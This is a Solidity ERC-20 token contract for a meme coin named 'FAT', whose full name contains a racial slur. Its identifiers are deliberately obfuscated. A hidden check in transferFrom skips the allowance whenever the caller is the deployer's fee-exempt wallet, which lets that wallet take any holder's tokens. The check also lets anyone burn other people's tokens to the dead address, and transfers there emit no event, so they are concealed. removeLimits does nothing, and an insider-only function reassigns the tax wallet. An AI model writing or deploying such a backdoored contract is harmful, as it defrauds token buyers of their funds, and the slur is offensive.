// SPDX-License-Identifier: MIT
/*
    Fat Nigga Season
    FAT

    AYO STFU ITS FAT  SEASON!!!!

    https://fatfella.vip
    https://t.me/FatFellaEth
    https://x.com/FatFellaEth
*/
pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract FAT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcFAT;
    mapping(address => mapping(address => uint256)) private _allcvnkjnFAT;
    mapping(address => bool) private _feevblknlFAT;
    address payable private _taxclknlFAT;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Fat Nigga Season";
    string private constant _symbol = unicode"FAT";
    uint256 public _vnbbvlkFAT = _tTotal / 100;
    uint256 public _oijboijoiFAT = 15 * 10**18;
    uint256 private _cvjkbnkjFAT = 10;
    uint256 private _vkjbnkfjFAT = 10;
    uint256 private _maxovnboiFAT = 10;
    uint256 private _initvkjnbkjFAT = 20;
    uint256 private _finvjlkbnlkjFAT = 0;
    uint256 private _redclkjnkFAT = 2;
    uint256 private _prevlfknjoiFAT = 2;
    uint256 private _buylkvnlkFAT = 0;
    IUniswapV2Router02 private uniswapV2Router;
    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknFAT;
    bool private _inlknblFAT = false;
    bool private swapvlkFAT = false;
    uint256 private _sellcnjkFAT = 0;
    uint256 private _lastflkbnlFAT = 0;
    address constant _deadlknFAT = address(0xdead);
    modifier lockTheSwap() {
        _inlknblFAT = true;
        _;
        _inlknblFAT = false;
    }
    constructor() payable {
        _taxclknlFAT = payable(_msgSender());
        _feevblknlFAT[address(this)] = true;
        _feevblknlFAT[_taxclknlFAT] = true;
        _balknvlkcFAT[_msgSender()] = (_tTotal * 2) / 100;
        _balknvlkcFAT[address(this)] = (_tTotal * 98) / 100;

        emit Transfer(address(0), _msgSender(), (_tTotal * 2) / 100);
        emit Transfer(address(0), address(this), (_tTotal * 98) / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcFAT[account];
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _downcklkojFAT(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlFAT[msg.sender]) return !_feevblknlFAT[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknFAT)) return false;
        return true;
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnFAT(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnFAT[owner][spender];
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnFAT(sender, recipient, amount);
        if (_downcklkojFAT(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnFAT[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnFAT[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer_kjvnFAT(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblFAT(from, to, amount);
        _balknvlkcFAT[from] = _balknvlkcFAT[from].sub(amount);
        _balknvlkcFAT[to] = _balknvlkcFAT[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcFAT[address(this)] = _balknvlkcFAT[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknFAT) emit Transfer(from, to, amount.sub(taxAmount));
    }
    function _calcTax_lvknblFAT(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblFAT) {
                taxAmount = amount
                    .mul((_buylkvnlkFAT > _redclkjnkFAT) ? _finvjlkbnlkjFAT : _initvkjnbkjFAT)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlFAT[to] &&
                to != _taxclknlFAT
            ) {
                _buylkvnlkFAT++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblFAT &&
                to == uniswapV2Pair &&
                from != _taxclknlFAT &&
                swapvlkFAT &&
                _buylkvnlkFAT > _prevlfknjoiFAT
            ) {
                if (block.number > _lastflkbnlFAT) {
                    _sellcnjkFAT = 0;
                }
                _sellcnjkFAT = _sellcnjkFAT + _getAmountOut_lvcbnkFAT(amount);
                require(_sellcnjkFAT <= _oijboijoiFAT, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkFAT)
                    _swapTokenslknlFAT(_vnbbvlkFAT > amount ? amount : _vnbbvlkFAT);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjFAT(address(this).balance);
                }
                _lastflkbnlFAT = block.number;
            }
        }
        return taxAmount;
    }
    function _sendETHTocvbnjFAT(uint256 amount) private {
        _taxclknlFAT.transfer(amount);
    }
    function _swapTokenslknlFAT(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function enableFATTrading() external onlyOwner {
        require(!_tradingvlknFAT, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkFAT = true;
        _tradingvlknFAT = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnFAT() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnkFAT(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
    function removeLimits () external onlyOwner {
    }
    function _setTax_lknblFAT(address payable newWallet) external {
        require(_feevblknlFAT[_msgSender()]);
        _taxclknlFAT = newWallet;
        _feevblknlFAT[_taxclknlFAT] = true;
    }
}